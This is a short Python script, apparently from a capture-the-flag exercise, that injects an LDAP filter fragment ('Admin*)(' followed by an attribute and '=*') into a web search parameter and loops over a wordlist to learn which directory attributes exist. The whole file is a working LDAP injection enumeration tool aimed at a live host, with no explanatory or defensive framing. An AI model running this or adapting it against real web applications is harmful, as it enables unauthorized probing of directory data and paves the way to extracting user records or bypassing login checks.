import requests
import string
import sys


def main():
    url = "http://jh2i.com:50019/?search=Admin*)("
    valid_attrs = []
    with open('attr_list.txt', 'r') as f:
        attr = f.readline().strip()
        while attr:
            full_url = url+attr+"=*"
            print(full_url)
            req = requests.get(full_url)
            rez = req.text.split('<tbody>')[1].split('</tbody>')[0].strip()
            if len(rez) > 0:
                valid_attrs.append(attr)
            attr = f.readline().strip()
    print("Valid attributes are:")
    print(valid_attrs)

if __name__ == "__main__":
    main()
